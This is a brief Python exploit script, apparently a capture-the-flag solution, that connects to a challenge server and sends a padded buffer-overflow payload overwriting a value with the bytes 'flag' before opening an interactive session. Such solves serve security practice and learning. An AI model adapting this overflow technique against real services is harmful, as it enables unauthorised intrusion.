from ptrlib import *

sock = Socket("chal.utc-ctf.club", 35235)
payload = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" + p32(0x67616C66)
sock.recvuntil("text: ")
sock.sendline(payload)
sock.interactive()
